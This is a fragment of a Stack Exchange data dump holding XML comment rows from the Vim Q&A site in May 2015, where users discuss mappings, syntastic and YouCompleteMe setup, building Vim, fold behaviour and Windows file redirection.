  <row Id="3404" PostId="3153" Score="0" Text="It's automatic code format I'm talking about. Even if I manually type a line break, after auto xml format, everything goes back to the original format." CreationDate="2015-05-03T12:34:07.610" UserId="1276" />
  <row Id="3405" PostId="3154" Score="0" Text="damn I did not check the doc, I was sure it was C-z not sure why..." CreationDate="2015-05-03T12:50:54.273" UserId="590" />
  <row Id="3406" PostId="3154" Score="0" Text="Well, `&lt;C-z&gt;` does make more sense; a (the first letter) to increase, and z (the last letter) to decrease ... But `&lt;C-z&gt;` can't be used because it's already used to suspends programs in terminals. I suspect the x was chosen because it's next to the z (on qwerty layouts anyway)." CreationDate="2015-05-03T12:59:11.290" UserId="51" />
  <row Id="3407" PostId="3153" Score="0" Text="What are you using to automatically format the xml?" CreationDate="2015-05-03T16:20:54.380" UserId="865" />
  <row Id="3408" PostId="3156" Score="0" Text="This question was [also posted to Stack Overflow](http://stackoverflow.com/q/30016143/660921)" CreationDate="2015-05-03T16:46:37.210" UserId="51" />
  <row Id="3409" PostId="3156" Score="0" Text="Indeed I made a double post by mistake I flagged it a few minutes ago to know what I should do." CreationDate="2015-05-03T16:50:07.567" UserId="1841" />
  <row Id="3410" PostId="2770" Score="0" Text="What do the first 2 lines do? As far as I can see, the assigned variables aren't used, and if I remove those lines, it still works." CreationDate="2015-05-03T23:02:52.423" UserId="51" />
  <row Id="3411" PostId="3153" Score="0" Text="I'm not clear what is vim currently automatically formatting xml, I installed the Chiel92/vim-autoformat plugin, and I think for xml files, it will use &quot;tidy&quot; program bundled with mac os to format it." CreationDate="2015-05-03T23:03:04.113" UserId="1276" />
  <row Id="3412" PostId="2916" Score="0" Text="This stops at the number 9, and above 10 it increments by 11, not 10 ... I think this is unintentional (ie. a bug)? In addition, you always want to use non-recursive mapping (`noremap`) and **never** `map`. See [this page](http://learnvimscriptthehardway.stevelosh.com/chapters/05.html)  for a more detailed explanation of that." CreationDate="2015-05-04T00:01:25.403" UserId="51" />
  <row Id="3413" PostId="3153" Score="0" Text="I don't know why I'm getting down votes. Does anyone have a solution for this problem? or I'm just the only one who wants this?" CreationDate="2015-05-04T00:24:52.117" UserId="1276" />
  <row Id="3415" PostId="3153" Score="0" Text="The problem with your original question is that you didn't really describe what you did. You just said &quot;not formatting them correctly&quot;, with no mention of what commands you used." CreationDate="2015-05-04T01:07:17.043" UserId="51" />
  <row Id="3417" PostId="2823" Score="0" Text="You should add the case for when you are on `}` to keep the muscle memory the same." CreationDate="2015-05-04T03:04:16.787" UserId="895" />
  <row Id="3419" PostId="3163" Score="0" Text="Try adding extra `&lt;CR&gt;` at the end of mapping: `nnoremap K :grep! &quot;\b&lt;C-R&gt;&lt;C-W&gt;\b&quot;&lt;CR&gt;:cw&lt;CR&gt;&lt;CR&gt;` ." CreationDate="2015-05-04T10:49:40.910" UserId="1782" />
  <row Id="3421" PostId="3163" Score="0" Text="I have it in both. However, adding an extra CR works" CreationDate="2015-05-04T10:55:45.297" UserId="1620" />
  <row Id="3422" PostId="3163" Score="4" Text="Mapping the mapping 'silent' also works: `nnoremap &lt;silent&gt; K ...`, this will prevent you from seeing the shell output from `ag`. I'm not sure if this is the 'proper' way to fix  this, though." CreationDate="2015-05-04T11:07:32.893" UserId="51" />
  <row Id="3423" PostId="3163" Score="1" Text="See also the [ag.vim](https://github.com/rking/ag.vim) plugin for a much nicer interface." CreationDate="2015-05-04T12:15:03.320" UserId="1577" />
  <row Id="3424" PostId="3167" Score="0" Text="I was hacking a little with your plugin, it does pretty great stuff. Thank you! But actually I wanted more `:bp`, `:bn`-like behaviour, I mean cycling jumping between _current_ buffers. So I don't want jump onto already deleted buffers and want to jump on the first one if it was last buffer in the list of accessed buffers." CreationDate="2015-05-04T14:21:13.567" UserId="500" />
  <row Id="3425" PostId="3167" Score="0" Text="Well, you could modify my plugin / take some parts to build your own. Actually, I use a slightly different approach to the problem; see my edit." CreationDate="2015-05-04T14:44:45.407" UserId="970" />
  <row Id="3426" PostId="3170" Score="1" Text="Maybe consider a more light weight plugin such as https://github.com/LaTeX-Box-Team/LaTeX-Box" CreationDate="2015-05-04T18:30:30.990" UserId="46" />
  <row Id="3427" PostId="3170" Score="0" Text="@FDinoff: Oh yes, using another plugin which also has this feature could work as well. :)" CreationDate="2015-05-04T18:39:07.797" UserId="1955" />
  <row Id="3428" PostId="3165" Score="0" Text="Related question: [How to achieve selection different length of texts on different lines](http://vi.stackexchange.com/q/2796/51)" CreationDate="2015-05-04T18:51:12.697" UserId="51" />
  <row Id="3429" PostId="3171" Score="0" Text="Honestly, vimtex seems to be *way* better then LaTeX-Box. I spent the last hour copying vim-latex‘ `*.latexmain` behavior, that‘s not needed here. Also you completions show `\tag{foo}` tags, that‘s also nice." CreationDate="2015-05-04T21:57:59.127" UserId="1955" />
  <row Id="3430" PostId="3161" Score="0" Text="Thanks Carpetsmoker, thanks for even teaching me how to find solution for problems. It's very useful." CreationDate="2015-05-05T00:05:44.423" UserId="1276" />
  <row Id="3432" PostId="3171" Score="0" Text="Thanks @Keba! I appreciate the feedback. Please don't hesitate to open issues if you find any bugs/have any problems/have ideas for new features." CreationDate="2015-05-05T06:02:40.920" UserId="21" />
  <row Id="3435" PostId="3165" Score="0" Text="I always think in vim multiple selections/cursors function is just eye-candy..." CreationDate="2015-05-05T08:30:34.973" UserId="1569" />
  <row Id="3436" PostId="2770" Score="0" Text="@Carpetsmoker Those lines (now deleted) were good old-fashioned cruft. If you watch the talk, you'll see that Conway arrives at this solution after a few iterations. The unnecessary variables were used in the earlier variations, but not in this one. I copied it over into my .vimrc before I really started learning vimscript, and obviously never looked at the code again, even when pasting it into my answer! Well spotted." CreationDate="2015-05-05T11:29:08.730" UserId="343" />
  <row Id="3437" PostId="3174" Score="1" Text="I can't reproduce this using `vim -u NONE -U NONE -N`. It might be an issue with your vimrc or a plugin." CreationDate="2015-05-05T11:39:31.637" UserId="865" />
  <row Id="3441" PostId="3174" Score="2" Text="Happens for me even with -u NONE -U NONE -N. I use v7.4 on arch linux" CreationDate="2015-05-05T13:39:16.440" UserId="1982" />
  <row Id="3442" PostId="3174" Score="1" Text="@EvergreenTree I have the same problem. With `vim -u NONE -U NONE -N fold-test` and just setting `foldmethod=marker`. I'm running Vim 7.4.712 on Arch. If I try the same with Vim on Vim 7.4.160 on CentOS 7, I get exactly the opposite results (all folds open when using `:m+1`). And Vim 7.2.441 on CentOS 6 works fine... All `fold*` settings seem to be the same on these machines." CreationDate="2015-05-05T13:41:59.847" UserId="51" />
  <row Id="3443" PostId="3174" Score="1" Text="That is very strange.  This seems like a bug." CreationDate="2015-05-05T14:35:34.707" UserId="865" />
  <row Id="3444" PostId="3171" Score="1" Text="As you may have noticed, I already did that (on github). :)" CreationDate="2015-05-05T16:29:46.473" UserId="1955" />
  <row Id="3445" PostId="3178" Score="0" Text="Ah, I didn't realize that!  Good observation.  I would use the runtime solution if I needed this for other filetypes." CreationDate="2015-05-05T18:24:49.403" UserId="865" />
  <row Id="3446" PostId="3174" Score="3" Text="That might be caused by patch 7.4.700 which tries to prevent, that folds get invalid on :move commands" CreationDate="2015-05-05T20:36:42.847" UserId="71" />
  <row Id="4447" PostId="3179" Score="1" Text="It seems to work for me in Windows. I installed Vim from the vim homepage, and used the default config." CreationDate="2015-05-06T10:11:57.973" UserId="51" />
  <row Id="4448" PostId="3179" Score="0" Text="Do you have a non-English keyboard layout? Does this also happen in a plain `gvim -N -u NONE`?" CreationDate="2015-05-06T10:40:09.340" UserId="970" />
  <row Id="4449" PostId="3179" Score="0" Text="@ingo I'm using an extended english keyboard (UK). Using the given options the keys do work as intended." CreationDate="2015-05-06T10:45:24.997" UserId="1057" />
  <row Id="4450" PostId="3179" Score="0" Text="Then you may have a mapping interfering. Check with `:verbose map &lt;C-[&gt;` and `:verbose map &lt;C-]&gt;` (when those don't work)." CreationDate="2015-05-06T10:56:38.453" UserId="970" />
  <row Id="4451" PostId="3179" Score="0" Text="@Ingo no mapping for these unfortunately." CreationDate="2015-05-06T11:01:01.317" UserId="1057" />
  <row Id="4452" PostId="3179" Score="0" Text="Too bad. Then I don't know any other way to troubleshoot than binary partitioning of your configuration: Comment out / remove half of your `~/.vimrc`, and repeat until the problem's gone. Same for used plugins." CreationDate="2015-05-06T11:09:06.577" UserId="970" />
  <row Id="4453" PostId="3179" Score="1" Text="@Ingo Oh my bad. It seems that's it's the keyboard problem. The `gvim -N -u NONE` does not change the problem (my keyboard must have change inadvertently to the normal UK I guess when I tested)." CreationDate="2015-05-06T11:19:49.453" UserId="1057" />
  <row Id="4457" PostId="3183" Score="1" Text="Cool. Now there seems to be too **many** ways to solve my problem! I understand that you combined both mechanisms in the example you gave in order to illustrate how to use them. But I wonder if it isn't sufficient to just use `nnoremap &lt;M-.&gt; :&lt;C-u&gt;call MyAmazingEnhancedDot(v:count1)&lt;cr&gt;` and skip the `command -count=1 EDot call MyAmazingEnhancedDot(&lt;count&gt;)`?" CreationDate="2015-05-07T04:01:43.417" UserId="390" />
  <row Id="4458" PostId="3183" Score="0" Text="Skipping the command option is fine. The only benefit you get from the command option is being able to call it from ex commands such as `:9EDot`. If you don't use ex commands a lot then skip it." CreationDate="2015-05-07T04:16:56.290" UserId="895" />
  <row Id="4459" PostId="2770" Score="0" Text="I recently replaced the vim-pulse (i think it's called) addon with this snippet and it's much better/faster" CreationDate="2015-05-07T07:49:11.553" UserId="248" />
  <row Id="4460" PostId="3184" Score="0" Text="IIRC, to install on custom directory, when you `./configure`, you need to add `--prefix=/home/[user]`. Or maybe `--prefix=/home/[user]/vim74`." CreationDate="2015-05-07T09:04:29.993" UserId="1782" />
  <row Id="4461" PostId="3184" Score="2" Text="Or try with `let $VIMRUNTIME=&quot;/home/[user]/vim74/&quot;` (without `runtime` ending)." CreationDate="2015-05-07T09:20:16.703" UserId="1782" />
  <row Id="4462" PostId="3184" Score="0" Text="@tivn Naively I was trying to run with the runtime as it was in the _source_. I had never run make install (because I wanted to keep everything in ~). configure with a prefix and a make install did resolve the issue. If you want to post that as an answer, I'll accept it." CreationDate="2015-05-07T09:26:15.853" UserId="2004" />
  <row Id="4463" PostId="3184" Score="0" Text="ok, I will write as answer" CreationDate="2015-05-07T09:32:07.903" UserId="1782" />
  <row Id="4464" PostId="3187" Score="0" Text="you have a missing colon in first command." CreationDate="2015-05-07T15:29:32.197" UserId="599" />
  <row Id="4465" PostId="3187" Score="0" Text="Typo fixed. Thanks." CreationDate="2015-05-07T16:03:49.397" UserId="54" />
  <row Id="4466" PostId="3190" Score="0" Text="Which version of clang do you have? According to [this page](http://clang.llvm.org/cxx_status.html) you need at least version 3.4 for `-std=c++14` to work. For earlier versions, you need to use `-std=c++1y` (invalid values for `-std` seem to be ignored)." CreationDate="2015-05-07T16:39:11.023" UserId="51" />
  <row Id="4467" PostId="3190" Score="0" Text="Do you also have YCM installed?" CreationDate="2015-05-07T17:13:31.823" UserId="1577" />
  <row Id="4468" PostId="3190" Score="0" Text="I have clang 3.6 installed, thus it should work :·)" CreationDate="2015-05-07T17:23:40.487" UserId="1463" />
  <row Id="4469" PostId="3190" Score="0" Text="Yes, I have YCM installed. Are there any incompatibilities with it?" CreationDate="2015-05-07T17:24:08.257" UserId="1463" />
  <row Id="4470" PostId="3190" Score="0" Text="Because YCM disables syntastic checks by default.  With recent versions of syntastic the `:SyntasticInfo` command will tell you that (provided that you run in against a C++ file)." CreationDate="2015-05-07T17:26:58.560" UserId="1577" />
  <row Id="4471" PostId="3190" Score="0" Text="According to [this site](http://stackoverflow.com/questions/24500281/youcompleteme-and-syntastic-compatibility), YCM is checking the file. Am I right?" CreationDate="2015-05-07T17:52:17.360" UserId="1463" />
  <row Id="4472" PostId="3190" Score="0" Text="Try `:help syntastic-ycm` for a shorter version.  But basically, yes, if you didn't set `g:ycm_show_diagnostics_ui` to 0, it's YCM that checks the file." CreationDate="2015-05-07T17:57:11.813" UserId="1577" />
  <row Id="4473" PostId="3190" Score="0" Text="Thank you  lcd047! Now that I added &quot;let g:ycm_show_diagnostics_ui = 0&quot; to my .vimrc, I have syntastic checking it! But it is talking about C++11 and not 14!: &quot; 'auto' type specifier is a C++11 extension [-Wc++11-extensions] [cpp/clang_check] &quot;" CreationDate="2015-05-07T18:04:45.033" UserId="1463" />
  <row Id="4474" PostId="3191" Score="1" Text="Thanks! Turns out it comes from the aliases that oh-my-zsh provides: https://github.com/robbyrussell/oh-my-zsh/wiki/Cheatsheet#helpful-aliases-for-common-git-tasks" CreationDate="2015-05-07T18:05:42.597" UserId="226" />
  <row Id="4475" PostId="3188" Score="0" Text="You may want to try to compile with the clean source code rather than using compiled source tree from first machine. Or perhaps you can check suggested answer for similar error message here: http://stackoverflow.com/questions/23281050/makefile-warning-warning-file-main-cpp-has-modification-time-2-1e04-s-in-th" CreationDate="2015-05-07T18:06:16.290" UserId="1782" />
  <row Id="4476" PostId="3190" Score="0" Text="What does this label tell you: `[cpp/clang_check]`? :)" CreationDate="2015-05-07T18:17:14.613" UserId="1577" />
  <row Id="4477" PostId="3190" Score="0" Text="Most issues with syntastic are actually issues with the checker used by syntastic, not with syntastic itself. Read your checker's documentation or find another checker that satisfies your requirements." CreationDate="2015-05-07T18:22:23.170" UserId="54" />
  <row Id="4479" PostId="3190" Score="0" Text="Ok, I understood what [cpp/clang_check] is! :·)&#xA;ok! Let's configure clang-check! &quot; cpp/clang_check &quot; points to &quot; c/clang_check &quot;. And at this point, I'm a bit lost. Is clang-check the same as clang, or a sub-part or anything else? I can't find how to configure it. Should I configure it directly or configure how Syntastic uses it?" CreationDate="2015-05-07T18:46:15.363" UserId="1463" />
  <row Id="4480" PostId="3188" Score="0" Text="If you can move the source compilation to a local disk (one not on a network drive). Run make clean and reconfigure the project (you might need to touch all the files in the tree to set the modification time to now.) Then recompile." CreationDate="2015-05-07T18:46:30.257" UserId="46" />
  <row Id="4481" PostId="3190" Score="0" Text="Please consider reading the docs before you read the sources.  Start with `:help syntastic`, skim through the [FAQ](https://github.com/scrooloose/syntastic#faq), then read the docs for the relevant [checkers](https://github.com/scrooloose/syntastic/wiki/Syntax-Checkers).  `clang-check` is a separate program (part of the CLANG project, but not the same as the compiler), and it has its own checker in syntastic.  You can read about it [here](https://github.com/scrooloose/syntastic/wiki/C--%3A---clang_check).  But really, carefully reading the docs can save you a lot of time." CreationDate="2015-05-07T18:58:10.597" UserId="1577" />
  <row Id="4482" PostId="3190" Score="0" Text="Actually, I did check the documentation, but did not understand how to add &quot;-std=c++14&quot; to it. And now I just realized that what I want to do is to add an argument, thus &quot; let g:syntastic_cpp_clang_check_post_args = &quot;-std=c++14&quot; &quot; ! And it works just fine! Thank you all!" CreationDate="2015-05-07T19:21:24.783" UserId="1463" />
  <row Id="4483" PostId="3192" Score="1" Text="Note that you're using gcc now, and not clang (clang has much better errors)." CreationDate="2015-05-07T19:37:11.990" UserId="51" />
  <row Id="4484" PostId="3192" Score="0" Text="@Carpetsmoker: He's actually using `clang-check`, which is essentially the same as clang's parser.  On a side note, `clang-tidy` is interesting too." CreationDate="2015-05-07T19:45:39.443" UserId="1577" />
  <row Id="4485" PostId="3190" Score="0" Text="The point is, in order to know __where__ to add it you really have to understand what syntastic is doing.  There is no such thing as telling syntastic &quot;use `--std=c++14` for C++&quot;.  The interface is downright barbaric, and it's way more complicated than it should be.  There are other serious problems with it too, f.i. not being able to infer compilation flags from makefiles.  But it's the best I could come up with given Vim's API. :(" CreationDate="2015-05-07T19:55:03.350" UserId="1577" />
  <row Id="4486" PostId="3183" Score="0" Text="Awesome. Now your perfect answer is complete!" CreationDate="2015-05-07T20:31:08.480" UserId="390" />
  <row Id="4488" PostId="3192" Score="0" Text="I am really sorry but I have to change my answer, because, as I came back to Vim and typed in something that would cause an error, I realized that actually, syntastic does NOT CORRECT AT ALL! Thats why it did not give anything about 'auto'.&#xA;&#xA;I know that it is only bypassing this problem, but by using gcc as syntastic checker and compiler, it works just fine! (really, this time!)." CreationDate="2015-05-07T21:08:09.367" UserId="1463" />
  <row Id="4490" PostId="3194" Score="0" Text="Is this the same problem as [issue 208](https://code.google.com/p/vim/issues/detail?id=208)? Please report there how to solve it, so we can perhaps change it later." CreationDate="2015-05-08T07:16:00.443" UserId="71" />
  <row Id="4491" PostId="3194" Score="0" Text="I think that is the same problem with this. I posted a comment there. Thank you for noting me." CreationDate="2015-05-08T08:37:45.980" UserId="2009" />
  <row Id="4492" PostId="3194" Score="0" Text="Thanks for updateing the issue" CreationDate="2015-05-08T08:44:51.647" UserId="71" />
  <row Id="4494" PostId="3198" Score="2" Text="I get &quot;E11: Invalid in command-line window; &lt;CR&gt; executes, CTRL-C quits&quot;, trying to do this." CreationDate="2015-05-08T09:31:32.667" UserId="2020" />
  <row Id="4495" PostId="3198" Score="1" Text="Please, see my edit." CreationDate="2015-05-08T09:41:50.160" UserId="54" />
  <row Id="4496" PostId="3187" Score="0" Text="Also, this does clobber the `&quot;` register.  I imagine you could use another register if you wanted to, or you could just save the `&quot;` register and restore it afterwards." CreationDate="2015-05-08T11:52:15.323" UserId="865" />
  <row Id="4497" PostId="3203" Score="1" Text="If your cursor is on a fold, pressing `l` will open it.  I don't think the leader key does anything in this case." CreationDate="2015-05-08T13:09:35.937" UserId="865" />
  <row Id="4498" PostId="3203" Score="3" Text="Check the mapping by using `:verbose &lt;leader&gt;l` to see if there is a map." CreationDate="2015-05-08T13:18:48.843" UserId="895" />
  <row Id="4499" PostId="3198" Score="1" Text="You can switch to another window from the cmdline window if you have executed a `:wincmd` before. It will then be in your cmdline history and you can execute it from there, like `:wincmd p&lt;CR&gt;q:k&lt;CR&gt;`. This also closes the cmdline window, however, so it's not very useful. But it should be possible to save the cursor position when leaving the cmdline window and so one can close it, do something else, and resume working with the cmdline history in the same place." CreationDate="2015-05-08T14:27:55.967" UserId="1306" />
  <row Id="4500" PostId="3205" Score="1" Text="I'm guessing your &quot;home&quot; directory is different between the two (gvim vs CLI Vim). Try executing the following in each and see how it compares: `:echo $MYVIMRC`" CreationDate="2015-05-08T17:00:07.613" UserId="227" />
  <row Id="4501" PostId="3205" Score="1" Text="That was one of my first suspicions as well, so I'm afraid I've tried that already with identical results for both. :(" CreationDate="2015-05-08T17:05:25.493" UserId="2030" />
  <row Id="4502" PostId="3205" Score="1" Text="And when editing the vimrc, does `:echo expand('%:p')` show the same thing in each as well?" CreationDate="2015-05-08T17:14:57.823" UserId="227" />
  <row Id="4503" PostId="3205" Score="0" Text="It does indeed." CreationDate="2015-05-08T17:27:58.197" UserId="2030" />
  <row Id="4504" PostId="3194" Score="0" Text="You can set the mtime of a file with the `touch` command. For example: `touch Makefile`. You combine this with `find` to run this on a large number of files: `find /path/to/vim/sources -exec touch {} +`" CreationDate="2015-05-08T17:53:52.363" UserId="51" />
  <row Id="4505" PostId="3205" Score="0" Text="Wow. Then I'm inclined to say that vim truly thinks it is editing the same file, which is backed up by your extra info about copying the file. Might be a feature in Windows. The folks at Super User might be able to shed more light on this. Let us know if you're interested in migrating this." CreationDate="2015-05-08T18:03:54.413" UserId="227" />
  <row Id="4506" PostId="3205" Score="0" Text="One other thought: You aren't running the command line in some compatibility mode, are you? I read somewhere that compatibility mode can redirect some file paths." CreationDate="2015-05-08T18:07:27.287" UserId="227" />
  <row Id="4507" PostId="1981" Score="0" Text="If you are using **MacVim** then you can hit `Cmd-A` to select all the text, then `Cmd-V` to paste over it. The same might work for GVim on **Windows**, using `Ctrl` instead of `Cmd`." CreationDate="2015-05-08T19:14:24.243" UserId="630" />
  <row Id="4508" PostId="2870" Score="0" Text="`&lt;Ctrl-L&gt;` is a quick way to force a redraw." CreationDate="2015-05-08T19:21:52.773" UserId="630" />
  <row Id="4509" PostId="3209" Score="0" Text="Thanks for suggestion, I've asked [another question](http://vi.stackexchange.com/q/3211/467) to address that if that's ok, so if you like, you could elaborate further how to uncompress such files with some specific example." CreationDate="2015-05-08T19:48:36.407" UserId="467" />
  <row Id="4510" PostId="3207" Score="0" Text="Thanks for suggestions. For gzip uncompression I've added [another one](http://vi.stackexchange.com/q/3211/467), so to it'd be more clearer I think." CreationDate="2015-05-08T19:52:46.450" UserId="467" />
  <row Id="4511" PostId="3207" Score="0" Text="It looks like the `-i` flag is not specified by POSIX for the `file(1)` command. In [Linux and OpenBSD, it's `-i` (lowercase)](http://www.openbsd.org/cgi-bin/man.cgi/OpenBSD-current/man1/file.1?query=file&amp;sec=1), but in [OS X, it's `-I` (capital)](https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man1/file.1.html). Both versions accept the long form `--mime`, though." CreationDate="2015-05-08T20:03:57.240" UserId="24" />
  <row Id="4512" PostId="3207" Score="0" Text="`text/html` files would get classified incorrectly." CreationDate="2015-05-08T20:04:33.623" UserId="24" />
  <row Id="4513" PostId="3211" Score="1" Text="Add `--compressed` to `curl` :-)" CreationDate="2015-05-08T20:18:13.377" UserId="51" />
  <row Id="4514" PostId="3211" Score="0" Text="@Carpetsmoker Good idea, but actually my original script uses `wget` to support partially-downloaded files (which curl doesn't), but on the other hand `wget` doesn't seems to support decompression. I've [tested this](http://unix.stackexchange.com/q/68117/21471), but it didn't work for me." CreationDate="2015-05-08T20:21:39.277" UserId="467" />
  <row Id="4515" PostId="3215" Score="0" Text="You don't need `.\{-}` here, `.*` would match the same thing. In both cases the last fragment that's surrounded by double quotes is retained." CreationDate="2015-05-08T21:01:43.580" UserId="8" />
  <row Id="4516" PostId="3214" Score="0" Text="Do you have something like `set rtp^=~/.vim/bundle/ctrlp.vim/` in your vimrc? If so remove it" CreationDate="2015-05-08T21:21:57.783" UserId="46" />
  <row Id="4517" PostId="2150" Score="0" Text="@Carpetsmoker I agree. It would be nice to do that if it was possible. As it happens this has worked well enough for me for a long time. YMMV." CreationDate="2015-05-08T23:38:20.103" UserId="195" />
  <row Id="4519" PostId="3214" Score="0" Text="Yes, the instructions here: http://kien.github.io/ctrlp.vim say to do so." CreationDate="2015-05-09T03:06:16.313" UserId="301" />
  <row Id="4520" PostId="3218" Score="0" Text="Thanks, I actually used `grep -o '&quot;.*&quot;'` for sake of simplicity." CreationDate="2015-05-09T09:27:49.897" UserId="467" />
  <row Id="4521" PostId="3208" Score="0" Text="I'm still not sure I understand what's going on. Can you elaborate on precisely how this causes opening a file from the context menu, not explicitly as admin (though on the admin account), to be the same as opening it from the command line as admin? Also, if file access is being redirected, I assume I should have another `_vimrc` file somewhere else, with the other contents. Searching for `_vimrc` I found one at `C:\Users\&lt;username&gt;\AppData\Local\VirtualStore\Program Files (x86)\Vim`, so that's probably it, right?" CreationDate="2015-05-09T10:37:53.553" UserId="2030" />
  <row Id="4522" PostId="3205" Score="0" Text="Thanks for the help @JohnO'M. I'm not running the command line in any compatibility mode, but Ingo is probably right with his answer. In retrospect, I shouldn't have edited the `_vimrc` in `%ProgramFiles%` to begin with, but on my previous laptop I had Vim installed on an Ubuntu VM. This is the first time I've installed on Windows. I think I just searched for `vimrc` and edited the only file I found. Evidently this was not the right thing to do. :)" CreationDate="2015-05-09T10:49:18.780" UserId="2030" />
  <row Id="4523" PostId="3208" Score="1" Text="Yes, `VirtualStore`, that's what it's called. I'm not sure about the detailed circumstances; sometimes (opening certain locations), Windows detects that elevation is necessary and does that automatically. I can just say for sure that without elevation, you get redirected." CreationDate="2015-05-09T18:24:02.607" UserId="970" />
  <row Id="4524" PostId="3222" Score="0" Text="This is perfect! It does add a very slight delay on pressing the spacebar (when after a word), but it's not enough to be a big deal, and of course it only happens when spell-check is enabled. For the beep, I made a script that runs `mplayer -really-quiet $SOUNDFILE &gt;/dev/null 2&gt;&amp;1 &amp;` and put that in as the action." CreationDate="2015-05-09T19:39:45.240" UserId="2036" />
  <row Id="4525" PostId="3222" Score="0" Text="Thanks! You could additional add `if &amp;spell &amp;&amp; spellbadword(...)` to disable even the word retrieval in case spell check is off." CreationDate="2015-05-09T19:43:22.147" UserId="970" />
  <row Id="4526" PostId="352" Score="0" Text="ctags approach asked at: http://stackoverflow.com/questions/25742396/creating-ctags-extension-for-markdown" CreationDate="2015-05-09T21:32:28.867" UserId="2038" />
  <row Id="4527" PostId="9" Score="1" Text="When you have read the documentation that @derobert points to, you may find [Jarrod Taylor's demo](https://www.youtube.com/watch?v=vMAeYp8mX_M) of writing python plugins helpful. He also hosts a &quot;plugin starter kit&quot; at [his github](https://github.com/JarrodCTaylor). I don't use it, but I found reading the code and the project wiki pages to be instructive." CreationDate="2015-05-10T11:34:59.773" UserId="1306" />
  <row Id="4528" PostId="3221" Score="0" Text="The question itself aside, do you really want to get your typing interrupted to fix a word? Wouldn't you be faster if you complete the writing first, then go through the errors, for example with a &quot;jump to next misspelled word&quot; command?" CreationDate="2015-05-11T08:32:24.100" UserId="850" />
  <row Id="4529" PostId="3221" Score="0" Text="My motivation goes more like this: the way I usually type, I can tell when I've clearly typed a word correctly, but sometimes I type a word and know that I fumbled it a little bit, but there's still a chance that I got it right. If it doesn't beep, then I know I got it right and I can go on without worrying about it; otherwise, I ^W over it and try again.&#xA;&#xA;This is a perfectly fair question, though – it's probably worth timing a few different approaches and seeing what happens." CreationDate="2015-05-11T14:28:43.010" UserId="2036" />
  <row Id="4530" PostId="3221" Score="0" Text="Ok, the way you do it, it would probably be more efficient. If the beep &quot;made you look&quot;, that would have probably slowed you down, but if you respond to a beep with an automatic ^W, without even looking at the screen, that should be as fast. Just be careful though, if your brain perceives the audible beep after you have started typing the next word, ^W would delete the wrong word. In such a case, you may even think of throwing away all inserted characters after a beep until ^W is pressed, so you can safely know that ^W deleted the misspelled word and you have to continue from there." CreationDate="2015-05-11T14:37:21.277" UserId="850" />
  <row Id="4531" PostId="3225" Score="11" Text="It depends in what environment you're working. Most text terminals send the same information to the application when you press `Esc` or `C-[`, so you're out of luck, but you may be able to do something with a GUI version of Vim or by reconfiguring your terminal." CreationDate="2015-05-11T20:35:02.887" UserId="8" />
  <row Id="4532" PostId="3225" Score="0" Text="Right! Not a vim issue. I'll find a workaround with the keyboard mappings. Thanks" CreationDate="2015-05-11T20:49:20.970" UserId="2022" />
  <row Id="4533" PostId="3227" Score="2" Text="Does `:help swap-exists-choices` answer your question?" CreationDate="2015-05-12T03:27:09.357" UserId="46" />
  <row Id="4534" PostId="3227" Score="0" Text="@FDinoff it helps, but I'm not quite clear on &quot;Abort&quot; still. &quot;also abort further commands.  This is useful when loading a script that edits several files&quot; - Are the &quot;further commands&quot; supposed to be from a vim script? Is it really common enough for a vim script to open new buffers that this is a concern?" CreationDate="2015-05-12T03:44:19.207" UserId="9" />
  <row Id="4535" PostId="3228" Score="3" Text="Try the plugin's issue tracker." CreationDate="2015-05-12T06:57:06.523" UserId="54" />
  <row Id="4536" PostId="3228" Score="0" Text="This looks like a bug." CreationDate="2015-05-12T07:00:41.987" UserId="1577" />
  <row Id="4538" PostId="3232" Score="3" Text="Bonus points for mentioning &lt;C-o&gt;, I'm underusing that." CreationDate="2015-05-12T11:37:32.983" UserId="1296" />
  <row Id="4539" PostId="3231" Score="1" Text="possible duplicate of [How can I use a line number to copy a line to where my cursor is?](http://vi.stackexchange.com/questions/3055/how-can-i-use-a-line-number-to-copy-a-line-to-where-my-cursor-is)" CreationDate="2015-05-12T13:26:50.083" UserId="895" />
  <row Id="4542" PostId="3229" Score="0" Text="So is there only a difference when opening in tabs or split windows (`-p`/`-o`/`-O`)? Just using `vim file1 file2` exits entirely on both quit and abort when file1 is being edited; and when file2 is being edited, the prompt doesn't appear until hitting next, and in that case both quit and abort just drop back to file1." CreationDate="2015-05-12T17:46:00.663" UserId="9" />
  <row Id="4543" PostId="3229" Score="1" Text="You don't understand.  Opening files is essentially a sequence of commands.  `vim file1 file2` does two things: it sets the arguments (the thing you can access with `argv()`), and it loads the _first_ file in the buffer.  The second file is actually loaded only when you run `:n` (or similar).  When Vim prompts you the arguments have already been set, so if you `Quit` at that point there is no &quot;further&quot; command left to run.  Also, other things count as commands too, f.i. `autocmd`s and commands set with `vim -c`.  You should think all this in terms of commands, not in terms of affected files." CreationDate="2015-05-12T18:23:50.357" UserId="1577" />
  <row Id="4544" PostId="3232" Score="7" Text="It's also worth mentioning that you can abbreviate `:4yank` with `:4y`" CreationDate="2015-05-12T18:44:43.257" UserId="2057" />
  <row Id="4548" PostId="3253" Score="1" Text="I remember seeing a related comment here: https://github.com/tpope/vim-pathogen/issues/102#issuecomment-45413916. Maybe you can just use the InsertLeave autocommand instead of that mapping?" CreationDate="2015-05-13T02:53:14.823" UserId="246" />
  <row Id="4549" PostId="3253" Score="1" Text="vim communicates the the terminal using escape sequences. Mapping escape breaks those escape sequences. Solution. Don't map escape." CreationDate="2015-05-13T05:18:44.047" UserId="46" />
  <row Id="4551" PostId="3246" Score="2" Text="The part about putting it into a named register with &quot;ay4 doesn't look right.  If you do that, vim will be waiting for you to say &quot;4 whats?&quot;.  E.g. if you then hit Enter it will yank 4 lines starting at the current position, if you type /foo&lt;Enter&gt; it will yank til the 4th following occurrance of &quot;foo&quot;, etc." CreationDate="2015-05-13T05:34:15.800" UserId="2065" />
  <row Id="4552" PostId="3258" Score="0" Text="I feel like `{0:'Off', 1:'On'}[&amp;hlsearch]` reads better than `strpart`" CreationDate="2015-05-13T05:41:08.397" UserId="46" />
  <row Id="4553" PostId="3258" Score="0" Text="Although you do realize that `nohlsearch` does something different from `set nohlsearch`?" CreationDate="2015-05-13T05:44:43.683" UserId="46" />
  <row Id="4554" PostId="3258" Score="0" Text="@FDinoff: To be honest, I copied that part from somewhere else many years ago, without giving it much though.  But you're right, of course; I'll edit my answer." CreationDate="2015-05-13T05:47:37.877" UserId="1577" />
